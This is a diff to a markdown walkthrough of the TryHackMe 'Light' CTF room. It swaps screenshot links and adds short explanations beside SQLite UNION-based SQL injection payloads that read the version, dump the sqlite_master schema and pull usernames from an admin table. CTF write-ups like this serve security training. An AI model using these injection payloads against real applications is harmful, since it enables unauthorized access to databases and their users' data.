@@ -77,19 +77,23 @@ Let's try with sqlite_version since CTF name was "Light"
 ' UnION SeleCT sqlite_version() '
 ```
 
-![Image](https://github.com/user-attachments/assets/f9395315-ffa7-47ba-94cb-65a7d4397506)
+![Image](https://github.com/user-attachments/assets/25348212-c85d-41f7-8a8c-7d13c35f9c37)
 
 It Works
 
 ---
 
+Using this command to extract database schema by concatenating SQL from sqlite_master table.
+
 ```sh
 ' UnION SeleCT group_concat(sql) from sqlite_master'
 ```
 
-![Image](https://github.com/user-attachments/assets/25348212-c85d-41f7-8a8c-7d13c35f9c37)
+![Image](https://github.com/user-attachments/assets/f9395315-ffa7-47ba-94cb-65a7d4397506)
 
 ---
+
+Getting the desired data as asked in the question.
 
 ```sh
 ' UnION SeleCT group_concat(username) from admintable '
@@ -103,3 +107,4 @@ It Works
 
 ---
 
+## Congratulations on solving the Light THM CTF
